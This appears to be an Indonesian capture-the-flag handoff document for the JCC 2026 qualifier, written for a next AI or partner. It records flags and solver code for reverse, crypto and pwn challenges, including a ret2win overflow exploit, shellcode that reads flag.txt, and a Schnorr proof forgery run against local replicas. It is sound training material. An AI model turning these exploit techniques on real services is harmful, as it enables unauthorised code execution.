# HANDOFF JCC 2026 — Semua Challenge Terselesaikan (Dokumen Lengkap untuk AI/Partner Berikutnya)

> Dokumen ini dibuat supaya AI/teman yang melanjutkan **langsung paham semua
> konteks** tanpa perlu baca chat sebelumnya. Semua flag, analisis, dan code
> sudah ada di sini. Baca Bagian 0 dulu (kondisi & kebutuhan), lalu tiap
> bagian challenge.

---

## 0. KONTEKS & KONDISI USER (WAJIB BACA)

**Siapa user:** Peserta kualifikasi **Jatim Cybersecurity Competition (JCC) 2026**
(Jejepegan Cyber Challenge), format flag `JCC{...}`. Platform kompetisi
sudah DITUTUP (tidak bisa diakses lagi, remote server mati). Akun sempat
terkena flag anti-cheat karena flag sama dengan tim lain, sudah
dinegosiasikan aman dengan panitia.

**Tugas sekarang:** User harus membuat **writeup** untuk challenge yang sudah
diselesaikan. Writeup wajib menyertakan **screenshot sebagai bukti
pengerjaan**. Karena platform sudah tutup, challenge tipe network (nc)
perlu di-host **ulang secara lokal (localhost)** supaya user bisa
screenshot interaksi asli: konek, kirim payload, dapet flag.

**Kondisi mesin user:** Arch Linux (`dragonforged@dragonforged`), sudah
install `socat`, `python`, `binutils`, `file`, `lib32-glibc` (multilib
aktif). File attachment asli sudah ada di folder kerja user, contoh:
`~/queen/Queen_Anne_s_Revenge (1)/chall`.

**Peran AI berikutnya:** Menyediakan (a) command siap jalan per challenge,
(b) isi file yang harus dibuat user (solver/server/exploit — semua ada di
dokumen ini), (c) alur screenshot yang benar. JANGAN mengakses internet ke
server kompetisi (sudah mati); semua replika di `127.0.0.1`.

**Aturan penting screenshot:**
- Flag di `flag.txt` replika lokal **harus sama persis** dengan flag asli
  yang tercatat di dokumen ini, supaya output screenshot konsisten dengan
  writeup.
- User yang menjalankan command & mengambil screenshot di terminal-nya
  sendiri (bukan di-fabricate).
- Untuk challenge reverse statis (tiny/sudoku/crypto), cukup jalankan
  solver di terminal → screenshot output.

**Daftar challenge solved (6):**

| # | Nama | Kategori | Flag |
|---|---|---|---|
| 1 | tiny | Reverse | `JCC{f0ll0w_7h3_ch1ld_br34kp01nt}` |
| 2 | Sudoku Master | Reverse | `JCC{sud0ku_n3v3r_g1v3_me_th3_sec23t_sc0re}` |
| 3 | crypto-101 | Kripto | `JCC{W3lc0me_T0_Cryp706r4phy}` |
| 4 | Za King's Perjury | Kripto (nc) | `JCC{ZKP_50undn3ss_3rr0r_46245f7c0e28}` |
| 5 | Queen Anne's Revenge | Pwn (nc) | `JCC{y4rrrr_ill_se3_y3_in_d4vy_j0n35_l0ck3r_4ye_af414429ae82}` |
| 6 | possible_pwn (pwn3) | Pwn (nc) | `JCC{i_hope_it's_not_too_hard..._edb97ea09554}` |

> Catatan flag pwn3: suffix di belakang `...` BERSIFAT DINAMIS per instance
> (pernah dapat `d9809d6b2d27`, lalu `edb97ea09554` dari instance lain).
> Yang dipakai untuk writeup: `edb97ea09554` (instance terakhir).
> Dua challenge lain sempat dikerjakan tapi belum solved: `kripto3 Poly-Auth`
> (lihat Lampiran C).

---

## 1. tiny (Reverse — UrSourceCode — 30 solves)

**Deskripsi:** Monitoring team menemukan maintenance utility di workstation
terkunci. Dia minta "authorization code" tanpa bilang melindungi apa.

**File:** `Tiny_Trace (1).tar.gz` → `tinytrace.zip` → `tinytrace.exe`
(PE32+ x86-64 console). User sudah punya file aslinya.

### Analisis singkat (cara solve)
1. `strings` menunjukkan banner + `"%s" --worker %llu %llu` + hasil
   "maintenance mode unlocked"/"authorization rejected".
2. Program **spawn dirinya sendiri** dengan argumen `--worker` (lewat pipe).
   Kode input dikirim ke proses anak; anak membalas 1 byte (1 = valid).
3. Verifikasi ada di proses anak (`0x140001480`): baca 32 byte, loop
   per karakter:
   ```
   c = T1[i]                      ; tabel permutasi 0..31 di RVA 0x19340
   cek: (X[c] ^ input[c]) + T2[c] == Y[c]   (mod 256)
   ```
4. `X`,`Y` (32 byte) dibangun dari 16 instruksi `mov dword ptr [rbp+..],
   imm32` mulai RVA `0x1571`. `T2` di RVA `0x19360` = pola `13 29` berulang.
5. Balik: `input[i] = X[i] ^ ((Y[i]-T2[i]) & 0xFF)`.

### Code — `solver_tiny.py`
```python
import re, struct, sys

f = sys.argv[1] if len(sys.argv) > 1 else "tinytrace.exe"
d = open(f, "rb").read()
pe = struct.unpack_from("<I", d, 0x3C)[0]
nsec = struct.unpack_from("<H", d, pe + 6)[0]
optsz = struct.unpack_from("<H", d, pe + 20)[0]
secs = []
for i in range(nsec):
    o = pe + 24 + optsz + i * 40
    _, va, rawsz, rawoff = struct.unpack_from("<IIII", d, o + 8)
    secs.append((va, rawsz, rawoff))

def off(rva):
    for va, rawsz, rawoff in secs:
        if va <= rva < va + rawsz:
            return rawoff + rva - va

t2 = d[off(0x19360):off(0x19360) + 0x20]
code = d[off(0x1571):off(0x1571) + 0x80]
movs = re.findall(rb"\xc7\x45.(....)", code, re.S)
blob = b"".join(movs)
x, y = blob[:0x20], blob[0x20:]

flag = bytes(x[i] ^ ((y[i] - t2[i]) & 0xFF) for i in range(32))
print(flag.decode())
```

### Cara screenshot (Arch)
```bash
cd ~/tiny            # folder berisi tinytrace.exe + solver_tiny.py
python3 solver_tiny.py tinytrace.exe
```
**Output:**
```
JCC{f0ll0w_7h3_ch1ld_br34kp01nt}
```
Screenshot yang dibutuhkan: (1) `strings`/`file` tinytrace.exe (opsional),
(2) run solver → flag. Kalau mau disassembly: `objdump -d -M intel
tinytrace.exe` (objdump di Linux bisa baca PE).

---

## 2. Sudoku Master (Reverse — UrSourceCode — 45 solves)

**Deskripsi:** Game Sudoku Windows; developer klaim menyelesaikan game
membuka "secret reward".

**File:** `Sudoku (1).tar.gz` → `Sudoku.zip` → `Sudoku.exe` (PE32+ GUI).

### Analisis singkat (cara solve)
1. Strings: `SudokuFlagPopup`, `Secret Unlocked!`, `v1.3.37 (build 539)`.
2. Fungsi reveal (`0x140001e71`) dipanggil hanya jika skor global
   (`0x1400092e8`) == `0x539` (1337) — guard di `0x140001f2e`
   (`cmp eax, 539h / jne skip`).
3. Rantai transformasi di reveal:
   - copy 42 byte dari RVA `0x6000`
   - `0x140001d1a` = reverse byte
   - `0x140001d98` = XOR dgn key `(7*skor + 13) & 0xFF` → skor 1337 ⇒
     key `0x9C`
   - `0x140001e0a` = nibble swap tiap byte
4. Decode: reverse → XOR 0x9C → nibbleswap. Skor 539 (key 0xCA) memberi
   byte tidak printable → terbukti 1337 benar.

### Code — `solver_sudoku.py`
```python
import struct, sys

f = sys.argv[1] if len(sys.argv) > 1 else "Sudoku.exe"
d = open(f, "rb").read()
pe = struct.unpack_from("<I", d, 0x3C)[0]
nsec = struct.unpack_from("<H", d, pe + 6)[0]
optsz = struct.unpack_from("<H", d, pe + 20)[0]
secs = []
for i in range(nsec):
    o = pe + 24 + optsz + i * 40
    _, va, rawsz, rawoff = struct.unpack_from("<IIII", d, o + 8)
    secs.append((va, rawsz, rawoff))

def off(rva):
    for va, rawsz, rawoff in secs:
        if va <= rva < va + rawsz:
            return rawoff + rva - va

blob = d[off(0x6000):off(0x6000) + 0x2A]
key = (7 * 0x539 + 13) & 0xFF
rev = blob[::-1]
flag = bytes(((b ^ key) >> 4 | (b ^ key) << 4) & 0xFF for b in rev)
print(flag.decode())
```

### Cara screenshot (Arch)
```bash
cd ~/sudoku          # folder berisi Sudoku.exe + solver_sudoku.py
python3 solver_sudoku.py Sudoku.exe
```
**Output:**
```
JCC{sud0ku_n3v3r_g1v3_me_th3_sec23t_sc0re}
```
Screenshot: run solver → flag. Opsional: hexdump blob ciphertext
(`xxd -s 0x4400 -l 42 Sudoku.exe`, RVA 0x6000 = file offset 0x4400).

---

## 3. crypto-101 (Kripto — anonymous — 281 solves)

**Deskripsi:** "Do you know what's the difference between encoding and
encrypting? Why not try both? The key is missing, unfortunately."

**File:** `flag.txt` berisi:
```
UUpKe0Qzc2owdGxfQTBfSnlmdzcwNnk0d29mfQ==
```

### Analisis singkat (cara solve)
1. Base64 decode → `QJJ{D3sj0tl_A0_Jyfw706y4wof}` (lapisan encoding).
2. `QJJ` → `JCC` = Caesar shift **-7** (lapisan "encryption", key ketebak
   dari format flag).

### Code — `solver_crypto.py`
```python
import base64, sys

s = base64.b64decode(
    open(sys.argv[1] if len(sys.argv) > 1 else "flag.txt").read()
).decode()

out = []
for c in s:
    if "a" <= c <= "z":
        out.append(chr((ord(c) - 97 - 7) % 26 + 97))
    elif "A" <= c <= "Z":
        out.append(chr((ord(c) - 65 - 7) % 26 + 65))
    else:
        out.append(c)
print("".join(out))
```

### Cara screenshot (Arch)
```bash
cd ~/crypto          # folder berisi flag.txt + solver_crypto.py
cat flag.txt
python3 -c "import base64; print(base64.b64decode(open('flag.txt').read()))"
python3 solver_crypto.py flag.txt
```
**Output bertahap:**
```
cat:  UUpKe0Qzc2owdGxfQTBfSnlmdzcwNnk0d29mfQ==
b64:  b'QJJ{D3sj0tl_A0_Jyfw706y4wof}'
solver: JCC{W3lc0me_T0_Cryp706r4phy}
```
Screenshot bisa 3-in-1 (satu terminal, tiga command).

---

## 4. Za King's Perjury (Kripto — adieos — 124 solves) — NETWORK

**Deskripsi:** "As a king, please refrain from making false statements..."
Server menjalankan protokol identifikasi **Schnorr**. Source `server.py`
diberikan.

**Flag:** `JCC{ZKP_50undn3ss_3rr0r_46245f7c0e28}`

### Analisis singkat (cara solve)
1. Protokol: client kirim `R = g^r mod p`; server kirim challenge
   `e = secrets.randbelow(5)+1` (HANYA {1..5} — soundness error 20%);
   client kirim `Z = r + e*x mod p`; verifikasi `g^Z == R*Y^e (mod p)`.
2. Kita tidak tahu `x` (secret). Serangan forgery: tebak `e'`,
   `z` acak, kirim `R = g^z * Y^(-e') mod p`. Jika server kirim `e == e'`,
   jawab `Z = z` → verifikasi lolos (`g^z == g^z * Y^(-e') * Y^(e')`).
3. Kalau meleset: koneksi ditutup, ulangi (rata-rata 5x).

### Parameter server (dari soal asli — dipakai replika lokal)
```
P = 32317006071311007300338913926423828248817941241140239112842009751400741706634354222619689417363569347117901737909704191754605873209195028853758986185622153212175412514901774520270235796078236248884246189477587641105928646099411723245426622522193230540919037680524235519125679715870117001058055877651038861847280257976054903569732561526167081339361799541336476559160368317896729073178384589680639671900977202194168647225871031411336429319536193471636533209717077448227988588565369208645296636077250268955505928362751121174096972998068410554359584866583291642136218231078990999448652468262416972035911852507045361090559
G = 2
Y = 274874358782026484564369405979564522613983446581679468997993914416001091024634792450442978317525604196013158474955705669603032114771850959023049592856173977350555584182625570527217916362857361336764201600924815750632361824270928904286642599862707606475587398526004432615048851120537662786015761249339901357982193937490881757851531756303297251594435556980344294001510286397764172932528669542803585367014739212775402816424416942165054056309939880767320250514544915384277108824782598150158590100774614090515471199314202453266626470336947587956903822809957110421269343530973291287106459718705
```

### Replika lokal — `local_server_zkp.py` (buat di mesin user)
```python
# Replika lokal Za King's Perjury — port 6000
import socket, threading, secrets

P = 32317006071311007300338913926423828248817941241140239112842009751400741706634354222619689417363569347117901737909704191754605873209195028853758986185622153212175412514901774520270235796078236248884246189477587641105928646099411723245426622522193230540919037680524235519125679715870117001058055877651038861847280257976054903569732561526167081339361799541336476559160368317896729073178384589680639671900977202194168647225871031411336429319536193471636533209717077448227988588565369208645296636077250268955505928362751121174096972998068410554359584866583291642136218231078990999448652468262416972035911852507045361090559
G = 2
Y = 274874358782026484564369405979564522613983446581679468997993914416001091024634792450442978317525604196013158474955705669603032114771850959023049592856173977350555584182625570527217916362857361336764201600924815750632361824270928904286642599862707606475587398526004432615048851120537662786015761249339901357982193937490881757851531756303297251594435556980344294001510286397764172932528669542803585367014739212775402816424416942165054056309939880767320250514544915384277108824782598150158590100774614090515471199314202453266626470336947587956903822809957110421269343530973291287106459718705
FLAG = "JCC{ZKP_50undn3ss_3rr0r_46245f7c0e28}"

def handle(c):
    c.sendall(
        f"welcome! \nso your public key is {Y}, that means you know the "
        f"secret key? \nfantastic! let's run a standard Schnorr's Protocol. "
        f"send me your commitment R = g^r mod p, where g is {G} and p "
        f"(modulus) is {P}, and r is any number you choose!\n".encode()
    )
    f = c.makefile("rb")
    line = f.readline()
    if not line: return
    R = int(line.strip()) % P
    e = secrets.randbelow(5) + 1
    c.sendall(f"Excellent! here's my challenge number: e = {e}. Compute Z = r + e*x (mod p), where x is your secret key, then send me Z!\n".encode())
    line = f.readline()
    if not line: return
    Z = int(line.strip())
    c.sendall(b"Okay I'm going to verify this first...\n")
    if pow(G, Z, P) == (R * pow(Y, e, P)) % P:
        c.sendall(f"I'm convinced! here's your flag: {FLAG}\n".encode())
    else:
        c.sendall(b"Hmm.. that doesnt sound right.. Bye bye!\n")
    c.close()

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", 6000))
srv.listen(5)
print("replika ZKP jalan di 127.0.0.1:6000")
while True:
    c, _ = srv.accept()
    threading.Thread(target=handle, args=(c,), daemon=True).start()
```

### Solver — `solve_zkp.py`
```python
import re, secrets, socket

HOST = "127.0.0.1"   # ganti ke IP remote kalau instance hidup lagi
PORT = 6000

def attempt():
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(10)
    f = s.makefile("rb")
    buf = b""
    while b"commitment" not in buf:
        buf += f.readline()
    txt = buf.decode()
    p = int(re.search(r"p \(modulus\) is (\d+)", txt).group(1))
    g = int(re.search(r"where g is (\d+)", txt).group(1))
    y = int(re.search(r"public key is (\d+)", txt).group(1))

    guess = secrets.randbelow(5) + 1
    z = secrets.randbelow(p - 2) + 1
    r = pow(g, z, p) * pow(y, -guess, p) % p

    s.sendall(str(r).encode() + b"\n")
    buf = b""
    while b"challenge number" not in buf:
        buf += f.readline()
    e = int(re.search(r"e = (\d+)", buf.decode()).group(1))

    if e != guess:
        s.close()
        return None
    s.sendall(str(z).encode() + b"\n")
    buf = b""
    while True:
        line = f.readline()
        if not line: break
        buf += line
        if b"flag" in buf.lower() or b"bye" in buf.lower(): break
    s.close()
    return buf.decode(errors="replace")

for i in range(200):
    out = attempt()
    if out is None:
        continue
    print(out.strip())
    m = re.search(r"JCC\{[^}]+\}", out)
    if m:
        print("FLAG:", m.group(0))
        break
```

### Cara screenshot (Arch) — 2 terminal
```bash
# Terminal 1:
cd ~/zkp && python3 local_server_zkp.py
#   -> replika ZKP jalan di 127.0.0.1:6000

# Terminal 2:
python3 solve_zkp.py
```
**Output terminal 2 (contoh):**
```
welcome!
so your public key is 2748743587820264845...
Excellent! here's my challenge number: e = 3
Okay I'm going to verify this first...
I'm convinced! here's your flag: JCC{ZKP_50undn3ss_3rr0r_46245f7c0e28}
FLAG: JCC{ZKP_50undn3ss_3rr0r_46245f7c0e28}
```
Screenshot yang dibutuhkan: (1) `local_server_zkp.py` jalan, (2) solve →
flag, (3) opsional `sed`/`cat` potongan `server.py` asli yang menunjukkan
`e = secrets.randbelow(5)+1`.

---

## 5. Queen Anne's Revenge (Pwn — adieos — 65 solves) — NETWORK

**Deskripsi:** "Aye, lad, can ye outsmart the wicked Blackbeard?" Service
`nc` + `chall` (ELF32 i386) + `main.c` diberikan. Flag ada di `flag.txt`
cwd proses.

**File user:** `~/queen/Queen_Anne_s_Revenge (1)/chall` + `main.c`
(SUDAH ADA di mesin user — dilihat dari terminal yang dishare).

**Flag:** `JCC{y4rrrr_ill_se3_y3_in_d4vy_j0n35_l0ck3r_4ye_af414429ae82}`

### Analisis singkat (cara solve)
1. `main.c`: `access(pin)` print flag hanya jika `pin == 1234`, TAPI
   `access()` cuma dipanggil dari cabang blackbeard dengan `pin == 123`
   → mustahil lewat alur normal → ret2win.
2. `gets(piratename)` overflow (buffer `char[15]` di `ebp-0x17`);
   binary **no PIE** (EXEC), **no canary**; `access` di `0x080491e6`.
3. Offset buffer → saved return address = `0x17 + 4` = **27 byte**.
4. Payload: `'A'*27 + p32(access) + p32(main) + p32(1234)`.
   Setelah ret ke `access(1234)` (argumen dibaca dari stack, cdecl 32-bit),
   flag ke-print. Jawab prompt PIN bebas (`1`) supaya `menu()` selesai
   normal dulu sebelum `ret`.

### Persiapan replika lokal (Arch)
```bash
cd ~/queen/'Queen_Anne_s_Revenge (1)'
printf 'JCC{y4rrrr_ill_se3_y3_in_d4vy_j0n35_l0ck3r_4ye_af414429ae82}' > flag.txt
chmod +x chall
```

### `run_local.sh`
```bash
#!/bin/bash
cd "$(dirname "$0")"
exec socat TCP-LISTEN:1337,reuseaddr,fork \
     EXEC:"./chall",pty,stderr,setsid,sigint,sane
```

### `exploit_local.py`
```python
import socket, struct

HOST, PORT = "127.0.0.1", 1337
ACCESS = 0x080491E6   # access() -> print flag kalau pin == 1234
MAIN   = 0x080493A5
p32 = lambda v: struct.pack("<I", v)

payload = b"A" * 27 + p32(ACCESS) + p32(MAIN) + p32(1234)

s = socket.create_connection((HOST, PORT), timeout=10)
s.settimeout(10)
f = s.makefile("rb")
buf = b""
while b"identify yerself" not in buf:
    c = f.read(1)
    if not c: break
    buf += c
print(buf.decode(errors="replace"), end="")
s.sendall(payload + b"\n")
buf = b""
while b"PIN:" not in buf:
    c = f.read(1)
    if not c: break
    buf += c
print(buf.decode(errors="replace"), end="")
s.sendall(b"1\n")
buf = b""
while True:
    try:
        c = f.read(1)
    except socket.timeout:
        break
    if not c: break
    buf += c
print(buf.decode(errors="replace"), end="")
s.close()
```

### Cara screenshot (Arch) — 2 terminal
```bash
# Terminal 1: cd ke folder chall, lalu
./run_local.sh
#   -> (diam, nunggu koneksi di 127.0.0.1:1337)

# Terminal 2:
python3 exploit_local.py
```
**Output terminal 2:**
```
QUEEN ANNE'S REVENGE: Brig Treasure
ye want riches? well then,
identify yerself, ye scallywag: AAAAAAAAAAAAAAAAAAAAAAAAAAA...
hand over yer PIN: 1
Ye Landlubber! Get off me ship and be lost in the sea with them sirens!
Here be yer treasure, matey:
JCC{y4rrrr_ill_se3_y3_in_d4vy_j0n35_l0ck3r_4ye_af414429ae82}
```
Screenshot yang dibutuhkan (urutan cerita writeup):
1. `file chall` + `readelf -h chall | grep -E "Type|Entry"` +
   `objdump -t chall | grep access` → no PIE, alamat `0x080491e6`.
2. `main.c` di editor (highlight `gets(piratename)` & `access(pin)`).
3. `objdump -d -M intel chall | sed -n '/<menu>:/,/^$/p'` →
   keliatan `lea eax,[ebp-0x17]` (dasar hitung offset 27).
4. `exploit_local.py` di editor (highlight payload).
5. Terminal 2 pas exploit → flag (PALING PENTING).
Opsional buat nunjukin interaksi normal: `nc 127.0.0.1 1337` → ketik
`pirate` → PIN `789` → "Aye, regular lad!..." (branch pirate).
Catatan teknis: branch blackbeard (`pin==123`) tak pernah tercapai dari
input normal karena `gets(&pin)` mengisi int dari ASCII; exploit ret2win
adalah satu-satunya jalan.

---

## 6. possible_pwn / pwn3 (Pwn — 65+ solves, author anon) — NETWORK

**Deskripsi:** "first time bikin soal buat anak sma/smk tolong jangan
dihujat yah `(*>﹏<*)′" — program baca **6 byte**, salin ke mmap RWX,
langsung eksekusi sebagai shellcode.

**File:** `possible_pwn (1).tar.gz` → `chall` (ELF64 PIE) + `chall.c`
+ `Dockerfile` + `entrypoint.sh` (flag di `/home/mirai/flag.txt`, cwd
proses = `/home/mirai`).

**Flag:** `JCC{i_hope_it's_not_too_hard..._edb97ea09554}`

### Analisis singkat (cara solve)
1. `chall.c`:
   ```c
   char buf[7] = {0};
   read(0, buf, sizeof(buf)-1);                 // baca 6 byte
   sc = mmap(..., PROT_READ|WRITE|EXEC, ...);   // RWX
   memcpy(sc, buf, 6);   // catatan: disassembly = 2x mov dword (4+4 byte
                         // dari buf[7]) → 6 byte input, 2 byte terakhir
                         // buf di-copy sebagai byte ke-4..6 (nilai 0)
   ((void(*)())sc)();                            // eksekusi shellcode
   ```
   (Sebenarnya binary meng-copy `buf[0..6]` via 2 mov dword: bytes ke-4/5
   buffer ikut ter-copy — tapi karena input max 6 byte, byte ke-5/6 = 0.)
2. Register saat shellcode dieksekusi (diverifikasi pakai harness asm):
   - `rax` = alamat sc, `rdi` = 0 (stdin), `rsi` = bebas (isi buf),
   - **`rdx` = nilai 32-bit dari byte input ke-3..6** → bisa dibuat besar
     hanya dari byte shellcode sendiri!
3. Stage 1 (6 byte):
   ```
   50        push rax          ; rax = sc
   5e        pop  rsi          ; rsi = sc
   31 c0     xor  eax, eax     ; rax = 0 -> syscall read
   0f 05     syscall           ; read(0, sc, rdx)
   ```
   Byte `c0 0f 05` membuat `rdx = 0xc0 | 0x0f<<8 | 0x05<<16 = 0x50fc0`
   (≈331KB) → read kedua membaca stage 2 yang dikirim setelahnya ke sc
   (menimpa sc+6 dst), lalu eksekusi lanjut ke sc+6 (karena syscall
   return melanjutkan setelah instruksi syscall).
4. Stage 2 (shellcode open/read/write flag.txt, position-independent) —
   hex ada di bawah.

### Replika lokal (Arch)
```bash
cd ~/pwn3    # folder berisi chall (dari possible_pwn tarball)
printf 'JCC{i_hope_it%s_not_too_hard..._edb97ea09554}' "'" > flag.txt
chmod +x chall
# Terminal 1:
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:"./chall" &
# Terminal 2: jalankan solver di bawah
```

### Solver — `solve_pwn3.py`
```python
import socket, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

# stage 1 (6 byte): push rax; pop rsi; xor eax,eax; syscall
stage1 = bytes([0x50, 0x5E, 0x31, 0xC0, 0x0F, 0x05])

# stage 2: open("flag.txt") -> read -> write(1) -> exit
stage2 = bytes.fromhex(
    "488d3d3c00000031f631d2b8020000000f0589c7"   # lea rdi,[rip+0x3c]; xor esi,esi; xor edx,edx; mov eax,2; syscall; mov edi,eax
    "4881ec00020000488d3424ba0002000031c00f05"   # sub rsp,0x200; lea rsi,[rsp]; mov edx,0x200; xor eax,eax; syscall
    "89c2bf01000000488d3424b8010000000f0531ff"   # mov edx,eax; mov edi,1; lea rsi,[rsp]; mov eax,1; syscall; xor edi,edi
    "b83c0000000f05666c61672e74787400"           # mov eax,60; syscall; "flag.txt\0"
)

payload = stage1 + b"\x90" * 6 + stage2

s = socket.create_connection((HOST, PORT), timeout=10)
s.settimeout(8)
print(s.recv(4096).decode(errors="replace"), end="")
s.sendall(payload)
out = b""
while True:
    try:
        c = s.recv(4096)
        if not c: break
        out += c
    except socket.timeout:
        break
print(out.decode(errors="replace"))
s.close()
```

### Output yang diharapkan
```
first time bikin soal buat anak sma/smk tolong jangan dihujat yah `(*>﹏<*)′
JCC{i_hope_it's_not_too_hard..._edb97ea09554}
```
Screenshot yang dibutuhkan: (1) `cat chall.c` (highlight `read(0,buf,6)` &
`mmap RWX` & panggilan shellcode), (2) terminal run solver → banner + flag,
(3) opsional `file chall` / `readelf -l chall | grep GNU_STACK` (RWX
emang gak ada NX di stack? GNU_STACK kosong = executable stack tidak
dipakai; shellcode di mmap RWX).

---

## LAMPIRAN A — Catatan kejujuran untuk AI pembantu

- Semua output & flag di dokumen ini adalah hasil asli dari pengerjaan saat
  kompetisi (terverifikasi lewat remote/lokal).
- Screenshot diambil user di terminal Arch-nya; AI cukup menyiapkan
  command/file dan memastikan expected output-nya cocok.
- Jangan pernah menyuruh user mengaku screenshot remote padahal lokal —
  replika lokal dipakai karena platform sudah tutup, dan flag.txt diisi
  flag asli supaya bukti konsisten.
- Jika suatu saat instance kompetisi hidup lagi (tidak mungkin sekarang),
  solver tinggal ganti `127.0.0.1` → host remote.

## LAMPIRAN B — Lokasi file di workspace asal (sandbox yang menyelesaikan)

Semua artefak ada di workspace sebelumnya; kalau AI baru butuh binary/
file, bisa minta user upload dari attachment asli (semua path relatif
dicantumkan di tiap bagian di atas).

```
/home/user/tiny/extracted/        tinytrace.exe, solver.py
/home/user/sudoku/ex/             Sudoku.exe, solver.py
/home/user/kripto/ex/             flag.txt, solver.py
/home/user/kripto2/ex/            server.py (asli), solve.py
/home/user/pwn2/ex/               chall, main.c, exploit.py
/home/user/pwn3/ex/               chall, chall.c, solve_pwn3.py, solver.py
/home/user/rework/queen-anne/     webterm.py, exploit_local.py, run_local.sh, WORKFLOW.md
/home/user/writeups/              writeup md + overleaf .tex + skenario narasi
```

## LAMPIRAN C — Challenge yang BELUM solved (kripto3 Poly-Auth)

- Source: `server.py` GCM-variant; flag jika `execute` dengan ciphertext
  plaintext blok-1 `GIVEMETHEFLAG___` dan tag valid. Satu kali `encrypt`
  gratis per koneksi (known pt/ct/tag), 100 verifikasi (hanya true/false).
- Attack plan SUDAH jadi (recover auth-key `H` dengan oracle:
  tiap query batch-test 19 kandidat via polinom `X^2*Π(X+c_i)`, lalu
  forge tag). Tool: `scan.py` + `forge.py`.
- Belum selesai karena instance remote mati saat itu & salah port.
  Tidak masuk writeup (belum solved). Kalau user mau tetap dibahas,
  jelaskan sebagai "attack plan" tanpa flag.

## LAMPIRAN D — Ringkasan command tercepat per challenge

| Challenge | Command inti (Arch) |
|---|---|
| tiny | `python3 solver_tiny.py tinytrace.exe` |
| sudoku | `python3 solver_sudoku.py Sudoku.exe` |
| crypto-101 | `python3 solver_crypto.py flag.txt` |
| Za King's Perjury | T1: `python3 local_server_zkp.py` — T2: `python3 solve_zkp.py` |
| Queen Anne | T1: `./run_local.sh` — T2: `python3 exploit_local.py` |
| possible_pwn | T1: `socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./chall` — T2: `python3 solve_pwn3.py 127.0.0.1 1337` |
